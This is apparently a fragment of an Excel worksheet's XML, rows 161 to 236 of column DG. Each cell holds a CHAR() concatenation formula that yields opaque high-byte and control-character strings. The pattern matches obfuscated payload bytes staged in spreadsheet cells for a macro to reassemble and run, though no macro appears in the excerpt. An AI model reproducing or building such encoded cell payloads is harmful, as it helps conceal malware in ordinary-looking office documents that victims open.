    <row r="161" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG161" t="str">
        <f>CHAR(193)&amp;CHAR(163)&amp;CHAR(226)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(26)&amp;CHAR(86)&amp;CHAR(23)&amp;CHAR(214)</f>
        <v>Á£â|Ÿ_x001D__x001A_V_x0017_Ö</v>
      </c>
    </row>
    <row r="162" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG162" t="str">
        <f>CHAR(203)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(120)&amp;CHAR(26)&amp;CHAR(92)&amp;CHAR(217)&amp;CHAR(163)&amp;CHAR(226)&amp;CHAR(124)</f>
        <v>Ë|Ÿx_x001A_\Ù£â|</v>
      </c>
    </row>
    <row r="163" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG163" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(26)&amp;CHAR(86)&amp;CHAR(20)&amp;CHAR(30)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(85)</f>
        <v>Ÿ_x001D__x001A_V_x0014__x001E_Ê|ŸU</v>
      </c>
    </row>
    <row r="164" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG164" t="str">
        <f>CHAR(217)&amp;CHAR(222)&amp;CHAR(42)&amp;CHAR(22)&amp;CHAR(90)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(215)&amp;CHAR(23)</f>
        <v>ÙÞ*_x0016_Z|Ÿ_x001D_×_x0017_</v>
      </c>
    </row>
    <row r="165" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG165" t="str">
        <f>CHAR(218)&amp;CHAR(3)&amp;CHAR(76)&amp;CHAR(125)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(155)&amp;CHAR(94)&amp;CHAR(130)</f>
        <v>Ú_x0003_L}Ÿ_x001D_7›^‚</v>
      </c>
    </row>
    <row r="166" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG166" t="str">
        <f>CHAR(239)&amp;CHAR(84)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(158)&amp;CHAR(84)&amp;CHAR(70)&amp;CHAR(186)&amp;CHAR(125)</f>
        <v>ïTŸ_x001D_RžTFº}</v>
      </c>
    </row>
    <row r="167" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG167" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(232)&amp;CHAR(214)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(25)&amp;CHAR(215)&amp;CHAR(150)</f>
        <v>Ÿ_x001D_èÖÕ†Ê_x0019_×–</v>
      </c>
    </row>
    <row r="168" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG168" t="str">
        <f>CHAR(94)&amp;CHAR(242)&amp;CHAR(253)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(215)&amp;CHAR(156)&amp;CHAR(147)&amp;CHAR(135)</f>
        <v>^òý†Ê|×œ“‡</v>
      </c>
    </row>
    <row r="169" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG169" t="str">
        <f>CHAR(212)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(20)&amp;CHAR(55)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(186)</f>
        <v>Ô†Ê4_x0014__x0014_7Ÿ^º</v>
      </c>
    </row>
    <row r="170" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG170" t="str">
        <f>CHAR(239)&amp;CHAR(84)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(40)&amp;CHAR(66)&amp;CHAR(222)&amp;CHAR(203)&amp;CHAR(124)</f>
        <v>ïTŸ_x001D_R(BÞË|</v>
      </c>
    </row>
    <row r="171" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG171" t="str">
        <f>CHAR(159)&amp;CHAR(152)&amp;CHAR(146)&amp;CHAR(216)&amp;CHAR(80)&amp;CHAR(193)&amp;CHAR(203)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(120)</f>
        <v>Ÿ˜’ØPÁË|Ÿx</v>
      </c>
    </row>
    <row r="172" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG172" t="str">
        <f>CHAR(30)&amp;CHAR(92)&amp;CHAR(209)&amp;CHAR(163)&amp;CHAR(226)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(27)&amp;CHAR(86)</f>
        <v>_x001E_\Ñ£â|Ÿ_x001D__x001B_V</v>
      </c>
    </row>
    <row r="173" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG173" t="str">
        <f>CHAR(21)&amp;CHAR(238)&amp;CHAR(203)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(167)&amp;CHAR(83)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>_x0015_îË|Ÿ§S×Õ†</v>
      </c>
    </row>
    <row r="174" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG174" t="str">
        <f>CHAR(175)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(17)&amp;CHAR(119)&amp;CHAR(255)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(52)</f>
        <v>¯4_x0014__x0011_wÿÕ†Ê4</v>
      </c>
    </row>
    <row r="175" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG175" t="str">
        <f>CHAR(30)&amp;CHAR(220)&amp;CHAR(2)&amp;CHAR(214)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(247)&amp;CHAR(150)&amp;CHAR(120)</f>
        <v>_x001E_Ü_x0002_ÖÕ†‚÷–x</v>
      </c>
    </row>
    <row r="176" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG176" t="str">
        <f>CHAR(26)&amp;CHAR(92)&amp;CHAR(233)&amp;CHAR(163)&amp;CHAR(226)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(173)&amp;CHAR(64)</f>
        <v>_x001A_\é£â|Ÿ_x001D_­@</v>
      </c>
    </row>
    <row r="177" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG177" t="str">
        <f>CHAR(181)&amp;CHAR(135)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(26)&amp;CHAR(221)&amp;CHAR(93)&amp;CHAR(82)&amp;CHAR(221)&amp;CHAR(135)</f>
        <v>µ‡Ê|_x001A_Ý]RÝ‡</v>
      </c>
    </row>
    <row r="178" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG178" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(250)&amp;CHAR(85)&amp;CHAR(217)&amp;CHAR(211)&amp;CHAR(240)&amp;CHAR(174)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>Ê|úUÙÓð®Ê|</v>
      </c>
    </row>
    <row r="179" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG179" t="str">
        <f>CHAR(159)&amp;CHAR(85)&amp;CHAR(87)&amp;CHAR(191)&amp;CHAR(212)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(29)</f>
        <v>ŸUW¿Ô†Ê4_x0014__x001D_</v>
      </c>
    </row>
    <row r="180" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG180" t="str">
        <f>CHAR(55)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(154)&amp;CHAR(239)&amp;CHAR(84)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(159)</f>
        <v>7Ÿ^šïTŸ_x001D_RŸ</v>
      </c>
    </row>
    <row r="181" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG181" t="str">
        <f>CHAR(84)&amp;CHAR(69)&amp;CHAR(186)&amp;CHAR(125)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(26)&amp;CHAR(92)&amp;CHAR(206)&amp;CHAR(175)</f>
        <v>TEº}Ÿ_x001D__x001A_\Î¯</v>
      </c>
    </row>
    <row r="182" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG182" t="str">
        <f>CHAR(18)&amp;CHAR(255)&amp;CHAR(95)&amp;CHAR(28)&amp;CHAR(209)&amp;CHAR(47)&amp;CHAR(212)&amp;CHAR(137)&amp;CHAR(69)&amp;CHAR(169)</f>
        <v>_x0012_ÿ__x001C_Ñ/Ô‰E©</v>
      </c>
    </row>
    <row r="183" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG183" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(158)&amp;CHAR(92)&amp;CHAR(70)&amp;CHAR(130)&amp;CHAR(77)&amp;CHAR(77)&amp;CHAR(164)</f>
        <v>Ÿ_x001D_Rž\F‚MM¤</v>
      </c>
    </row>
    <row r="184" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG184" t="str">
        <f>CHAR(94)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(175)&amp;CHAR(52)&amp;CHAR(20)&amp;CHAR(41)&amp;CHAR(119)&amp;CHAR(255)</f>
        <v>^×Õ†¯4_x0014_)wÿ</v>
      </c>
    </row>
    <row r="185" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG185" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(131)&amp;CHAR(201)&amp;CHAR(45)&amp;CHAR(215)&amp;CHAR(23)&amp;CHAR(218)&amp;CHAR(2)</f>
        <v>Õ†ÊƒÉ-×_x0017_Ú_x0002_</v>
      </c>
    </row>
    <row r="186" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG186" t="str">
        <f>CHAR(124)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(146)&amp;CHAR(239)&amp;CHAR(84)</f>
        <v>||Ÿ_x001D_7Ÿ^’ïT</v>
      </c>
    </row>
    <row r="187" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG187" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(159)&amp;CHAR(92)&amp;CHAR(4)&amp;CHAR(210)&amp;CHAR(125)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_RŸ\_x0004_Ò}Ÿ_x001D_</v>
      </c>
    </row>
    <row r="188" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG188" t="str">
        <f>CHAR(55)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(138)&amp;CHAR(239)&amp;CHAR(84)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(159)</f>
        <v>7Ÿ^ŠïTŸ_x001D_RŸ</v>
      </c>
    </row>
    <row r="189" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG189" t="str">
        <f>CHAR(84)&amp;CHAR(71)&amp;CHAR(226)&amp;CHAR(125)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(186)</f>
        <v>TGâ}Ÿ_x001D_7Ÿ^º</v>
      </c>
    </row>
    <row r="190" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG190" t="str">
        <f>CHAR(239)&amp;CHAR(84)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(40)&amp;CHAR(130)&amp;CHAR(206)&amp;CHAR(175)&amp;CHAR(52)</f>
        <v>ïTŸ_x001D_R(‚Î¯4</v>
      </c>
    </row>
    <row r="191" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG191" t="str">
        <f>CHAR(20)&amp;CHAR(25)&amp;CHAR(119)&amp;CHAR(255)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(52)&amp;CHAR(154)&amp;CHAR(133)</f>
        <v>_x0014__x0019_wÿÕ†Ê4š…</v>
      </c>
    </row>
    <row r="192" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG192" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(206)&amp;CHAR(65)&amp;CHAR(124)&amp;CHAR(215)&amp;CHAR(150)&amp;CHAR(82)&amp;CHAR(154)</f>
        <v>R×ÕÎA|×–Rš</v>
      </c>
    </row>
    <row r="193" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG193" t="str">
        <f>CHAR(228)&amp;CHAR(79)&amp;CHAR(175)&amp;CHAR(48)&amp;CHAR(20)&amp;CHAR(25)&amp;CHAR(119)&amp;CHAR(255)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>äO¯0_x0014__x0019_wÿÕ†</v>
      </c>
    </row>
    <row r="194" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG194" t="str">
        <f>CHAR(202)&amp;CHAR(53)&amp;CHAR(30)&amp;CHAR(221)&amp;CHAR(74)&amp;CHAR(214)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(135)&amp;CHAR(247)</f>
        <v>Ê5_x001E_ÝJÖÕ†‡÷</v>
      </c>
    </row>
    <row r="195" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG195" t="str">
        <f>CHAR(159)&amp;CHAR(120)&amp;CHAR(26)&amp;CHAR(92)&amp;CHAR(193)&amp;CHAR(163)&amp;CHAR(226)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿx_x001A_\Á£â|Ÿ_x001D_</v>
      </c>
    </row>
    <row r="196" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG196" t="str">
        <f>CHAR(26)&amp;CHAR(86)&amp;CHAR(23)&amp;CHAR(174)&amp;CHAR(203)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(120)&amp;CHAR(26)&amp;CHAR(92)</f>
        <v>_x001A_V_x0017_®Ë|Ÿx_x001A_\</v>
      </c>
    </row>
    <row r="197" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG197" t="str">
        <f>CHAR(217)&amp;CHAR(163)&amp;CHAR(226)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(26)&amp;CHAR(86)&amp;CHAR(20)&amp;CHAR(30)</f>
        <v>Ù£â|Ÿ_x001D__x001A_V_x0014__x001E_</v>
      </c>
    </row>
    <row r="198" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG198" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(85)&amp;CHAR(217)&amp;CHAR(222)&amp;CHAR(42)&amp;CHAR(22)&amp;CHAR(226)&amp;CHAR(125)</f>
        <v>Ê|ŸUÙÞ*_x0016_â}</v>
      </c>
    </row>
    <row r="199" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG199" t="str">
        <f>CHAR(159)&amp;CHAR(29)&amp;CHAR(55)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(178)&amp;CHAR(239)&amp;CHAR(84)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>Ÿ_x001D_7Ÿ^²ïTŸ_x001D_</v>
      </c>
    </row>
    <row r="200" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG200" t="str">
        <f>CHAR(82)&amp;CHAR(129)&amp;CHAR(156)&amp;CHAR(15)&amp;CHAR(58)&amp;CHAR(52)&amp;CHAR(18)&amp;CHAR(8)&amp;CHAR(133)&amp;CHAR(215)</f>
        <v>Rœ_x000F_:4_x0012__x0008_…×</v>
      </c>
    </row>
    <row r="201" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG201" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(241)&amp;CHAR(146)&amp;CHAR(180)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(110)</f>
        <v>Õ†‚ñ’´R×Õn</v>
      </c>
    </row>
    <row r="202" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG202" t="str">
        <f>CHAR(156)&amp;CHAR(132)&amp;CHAR(96)&amp;CHAR(226)&amp;CHAR(11)&amp;CHAR(109)&amp;CHAR(213)&amp;CHAR(133)&amp;CHAR(202)&amp;CHAR(124)</f>
        <v>œ„`â_x000B_mÕ…Ê|</v>
      </c>
    </row>
    <row r="203" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG203" t="str">
        <f>CHAR(222)&amp;CHAR(165)&amp;CHAR(82)&amp;CHAR(151)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(53)&amp;CHAR(172)&amp;CHAR(215)&amp;CHAR(156)</f>
        <v>Þ¥R—Õ†5¬×œ</v>
      </c>
    </row>
    <row r="204" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG204" t="str">
        <f>CHAR(150)&amp;CHAR(95)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(191)&amp;CHAR(215)&amp;CHAR(156)&amp;CHAR(150)&amp;CHAR(95)</f>
        <v>–_Õ†Ê¿×œ–_</v>
      </c>
    </row>
    <row r="205" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG205" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(191)&amp;CHAR(18)&amp;CHAR(5)&amp;CHAR(210)&amp;CHAR(69)&amp;CHAR(91)&amp;CHAR(136)</f>
        <v>Õ†Ê¿_x0012__x0005_ÒE[ˆ</v>
      </c>
    </row>
    <row r="206" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG206" t="str">
        <f>CHAR(173)&amp;CHAR(52)&amp;CHAR(44)&amp;CHAR(17)&amp;CHAR(45)&amp;CHAR(127)&amp;CHAR(237)&amp;CHAR(2)&amp;CHAR(34)&amp;CHAR(162)</f>
        <v>­4,_x0011_-í_x0002_"¢</v>
      </c>
    </row>
    <row r="207" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG207" t="str">
        <f>CHAR(1)&amp;CHAR(198)&amp;CHAR(96)&amp;CHAR(4)&amp;CHAR(102)&amp;CHAR(63)&amp;CHAR(239)&amp;CHAR(61)&amp;CHAR(29)&amp;CHAR(26)</f>
        <v>_x0001_Æ`_x0004_f?ï=_x001D__x001A_</v>
      </c>
    </row>
    <row r="208" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG208" t="str">
        <f>CHAR(243)&amp;CHAR(159)&amp;CHAR(81)&amp;CHAR(115)&amp;CHAR(248)&amp;CHAR(106)&amp;CHAR(77)&amp;CHAR(204)&amp;CHAR(107)&amp;CHAR(106)</f>
        <v>óŸQsøjMÌkj</v>
      </c>
    </row>
    <row r="209" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG209" t="str">
        <f>CHAR(250)&amp;CHAR(60)&amp;CHAR(160)&amp;CHAR(52)&amp;CHAR(22)&amp;CHAR(173)&amp;CHAR(230)&amp;CHAR(103)&amp;CHAR(30)&amp;CHAR(192)</f>
        <v>ú&lt; 4_x0016_­æg_x001E_À</v>
      </c>
    </row>
    <row r="210" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG210" t="str">
        <f>CHAR(162)&amp;CHAR(237)&amp;CHAR(189)&amp;CHAR(122)&amp;CHAR(125)&amp;CHAR(28)&amp;CHAR(239)&amp;CHAR(45)&amp;CHAR(24)&amp;CHAR(109)</f>
        <v>¢í½z}_x001C_ï-_x0018_m</v>
      </c>
    </row>
    <row r="211" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG211" t="str">
        <f>CHAR(3)&amp;CHAR(93)&amp;CHAR(82)&amp;CHAR(23)&amp;CHAR(154)&amp;CHAR(37)&amp;CHAR(192)&amp;CHAR(66)&amp;CHAR(188)&amp;CHAR(122)</f>
        <v>_x0003_]R_x0017_š%ÀB¼z</v>
      </c>
    </row>
    <row r="212" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG212" t="str">
        <f>CHAR(125)&amp;CHAR(28)&amp;CHAR(239)&amp;CHAR(45)&amp;CHAR(24)&amp;CHAR(109)&amp;CHAR(3)&amp;CHAR(93)&amp;CHAR(82)&amp;CHAR(23)</f>
        <v>}_x001C_ï-_x0018_m_x0003_]R_x0017_</v>
      </c>
    </row>
    <row r="213" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG213" t="str">
        <f>CHAR(154)&amp;CHAR(37)&amp;CHAR(192)&amp;CHAR(66)&amp;CHAR(67)&amp;CHAR(139)&amp;CHAR(164)&amp;CHAR(210)&amp;CHAR(252)&amp;CHAR(173)</f>
        <v>š%ÀBC‹¤Òü­</v>
      </c>
    </row>
    <row r="214" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG214" t="str">
        <f>CHAR(169)&amp;CHAR(74)&amp;CHAR(50)&amp;CHAR(150)&amp;CHAR(150)&amp;CHAR(239)&amp;CHAR(73)&amp;CHAR(116)&amp;CHAR(109)&amp;CHAR(111)</f>
        <v>©J2––ïItmo</v>
      </c>
    </row>
    <row r="215" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG215" t="str">
        <f>CHAR(233)&amp;CHAR(29)&amp;CHAR(102)&amp;CHAR(215)&amp;CHAR(251)&amp;CHAR(134)&amp;CHAR(250)&amp;CHAR(124)&amp;CHAR(177)&amp;CHAR(29)</f>
        <v>é_x001D_f×û†ú|±_x001D_</v>
      </c>
    </row>
    <row r="216" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG216" t="str">
        <f>CHAR(97)&amp;CHAR(215)&amp;CHAR(229)&amp;CHAR(134)&amp;CHAR(249)&amp;CHAR(124)&amp;CHAR(174)&amp;CHAR(29)&amp;CHAR(107)&amp;CHAR(215)</f>
        <v>a×å†ù|®_x001D_k×</v>
      </c>
    </row>
    <row r="217" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG217" t="str">
        <f>CHAR(213)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)</f>
        <v>Õ†Ê|Ÿ_x001D_R×Õ†</v>
      </c>
    </row>
    <row r="218" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG218" t="str">
        <f>CHAR(202)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(134)&amp;CHAR(129)&amp;CHAR(57)</f>
        <v>Ê|Ÿ_x001D_R×Õ†9</v>
      </c>
    </row>
    <row r="219" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG219" t="str">
        <f>CHAR(205)&amp;CHAR(83)&amp;CHAR(23)&amp;CHAR(155)&amp;CHAR(230)&amp;CHAR(180)&amp;CHAR(228)&amp;CHAR(56)&amp;CHAR(211)&amp;CHAR(81)</f>
        <v>ÍS_x0017_›æ´ä8ÓQ</v>
      </c>
    </row>
    <row r="220" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG220" t="str">
        <f>CHAR(82)&amp;CHAR(155)&amp;CHAR(186)&amp;CHAR(231)&amp;CHAR(174)&amp;CHAR(48)&amp;CHAR(246)&amp;CHAR(127)&amp;CHAR(32)&amp;CHAR(182)</f>
        <v>R›ºç®0ö ¶</v>
      </c>
    </row>
    <row r="221" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG221" t="str">
        <f>CHAR(167)&amp;CHAR(255)&amp;CHAR(139)&amp;CHAR(124)&amp;CHAR(201)&amp;CHAR(116)&amp;CHAR(32)&amp;CHAR(163)&amp;CHAR(160)&amp;CHAR(231)</f>
        <v>§ÿ‹|Ét £ ç</v>
      </c>
    </row>
    <row r="222" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG222" t="str">
        <f>CHAR(166)&amp;CHAR(61)&amp;CHAR(243)&amp;CHAR(113)&amp;CHAR(61)&amp;CHAR(180)&amp;CHAR(213)&amp;CHAR(208)&amp;CHAR(163)&amp;CHAR(14)</f>
        <v>¦=óq=´ÕÐ£_x000E_</v>
      </c>
    </row>
    <row r="223" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG223" t="str">
        <f>CHAR(235)&amp;CHAR(104)&amp;CHAR(51)&amp;CHAR(187)&amp;CHAR(147)&amp;CHAR(244)&amp;CHAR(175)&amp;CHAR(25)&amp;CHAR(159)&amp;CHAR(80)</f>
        <v>ëh3»“ô¯_x0019_ŸP</v>
      </c>
    </row>
    <row r="224" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG224" t="str">
        <f>CHAR(1)&amp;CHAR(148)&amp;CHAR(154)&amp;CHAR(212)&amp;CHAR(143)&amp;CHAR(57)&amp;CHAR(177)&amp;CHAR(89)&amp;CHAR(30)&amp;CHAR(155)</f>
        <v>_x0001_”šÔ9±Y_x001E_›</v>
      </c>
    </row>
    <row r="225" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG225" t="str">
        <f>CHAR(213)&amp;CHAR(197)&amp;CHAR(134)&amp;CHAR(46)&amp;CHAR(220)&amp;CHAR(111)&amp;CHAR(55)&amp;CHAR(182)&amp;CHAR(161)&amp;CHAR(227)</f>
        <v>ÕÅ†.Üo7¶¡ã</v>
      </c>
    </row>
    <row r="226" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG226" t="str">
        <f>CHAR(131)&amp;CHAR(18)&amp;CHAR(236)&amp;CHAR(105)&amp;CHAR(51)&amp;CHAR(185)&amp;CHAR(182)&amp;CHAR(227)&amp;CHAR(202)&amp;CHAR(51)</f>
        <v>ƒ_x0012_ìi3¹¶ãÊ3</v>
      </c>
    </row>
    <row r="227" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG227" t="str">
        <f>CHAR(211)&amp;CHAR(88)&amp;CHAR(19)&amp;CHAR(130)&amp;CHAR(129)&amp;CHAR(181)&amp;CHAR(248)&amp;CHAR(82)&amp;CHAR(219)&amp;CHAR(81)</f>
        <v>ÓX_x0013_‚µøRÛQ</v>
      </c>
    </row>
    <row r="228" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG228" t="str">
        <f>CHAR(30)&amp;CHAR(215)&amp;CHAR(134)&amp;CHAR(231)&amp;CHAR(172)&amp;CHAR(25)&amp;CHAR(222)&amp;CHAR(111)&amp;CHAR(32)&amp;CHAR(182)</f>
        <v>_x001E_×†ç¬_x0019_Þo ¶</v>
      </c>
    </row>
    <row r="229" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG229" t="str">
        <f>CHAR(172)&amp;CHAR(197)&amp;CHAR(184)&amp;CHAR(25)&amp;CHAR(254)&amp;CHAR(105)&amp;CHAR(55)&amp;CHAR(215)&amp;CHAR(134)&amp;CHAR(231)</f>
        <v>¬Å¸_x0019_þi7×†ç</v>
      </c>
    </row>
    <row r="230" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG230" t="str">
        <f>CHAR(172)&amp;CHAR(25)&amp;CHAR(222)&amp;CHAR(111)&amp;CHAR(32)&amp;CHAR(182)&amp;CHAR(172)&amp;CHAR(197)&amp;CHAR(184)&amp;CHAR(25)</f>
        <v>¬_x0019_Þo ¶¬Å¸_x0019_</v>
      </c>
    </row>
    <row r="231" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG231" t="str">
        <f>CHAR(254)&amp;CHAR(105)&amp;CHAR(55)&amp;CHAR(129)&amp;CHAR(176)&amp;CHAR(229)&amp;CHAR(190)&amp;CHAR(19)&amp;CHAR(237)&amp;CHAR(29)</f>
        <v>þi7°å¾_x0013_í_x001D_</v>
      </c>
    </row>
    <row r="232" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG232" t="str">
        <f>CHAR(1)&amp;CHAR(182)&amp;CHAR(179)&amp;CHAR(227)&amp;CHAR(139)&amp;CHAR(14)&amp;CHAR(237)&amp;CHAR(124)&amp;CHAR(43)&amp;CHAR(150)</f>
        <v>_x0001_¶³ã‹_x000E_í|+–</v>
      </c>
    </row>
    <row r="233" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG233" t="str">
        <f>CHAR(182)&amp;CHAR(229)&amp;CHAR(175)&amp;CHAR(15)&amp;CHAR(236)&amp;CHAR(89)&amp;CHAR(51)&amp;CHAR(163)&amp;CHAR(180)&amp;CHAR(134)</f>
        <v>¶å¯_x000F_ìY3£´†</v>
      </c>
    </row>
    <row r="234" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG234" t="str">
        <f>CHAR(153)&amp;CHAR(29)&amp;CHAR(249)&amp;CHAR(120)&amp;CHAR(19)&amp;CHAR(165)&amp;CHAR(167)&amp;CHAR(231)&amp;CHAR(179)&amp;CHAR(41)</f>
        <v>™_x001D_ùx_x0013_¥§ç³)</v>
      </c>
    </row>
    <row r="235" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG235" t="str">
        <f>CHAR(241)&amp;CHAR(124)&amp;CHAR(49)&amp;CHAR(180)&amp;CHAR(176)&amp;CHAR(245)&amp;CHAR(185)&amp;CHAR(56)&amp;CHAR(254)&amp;CHAR(105)</f>
        <v>ñ|1´°õ¹8þi</v>
      </c>
    </row>
    <row r="236" spans="111:111" x14ac:dyDescent="0.45">
      <c r="DG236" t="str">
        <f>CHAR(51)&amp;CHAR(215)&amp;CHAR(134)&amp;CHAR(231)&amp;CHAR(172)&amp;CHAR(25)&amp;CHAR(222)&amp;CHAR(111)&amp;CHAR(32)&amp;CHAR(182)</f>
        <v>3×†ç¬_x0019_Þo ¶</v>
      </c>
    </row>
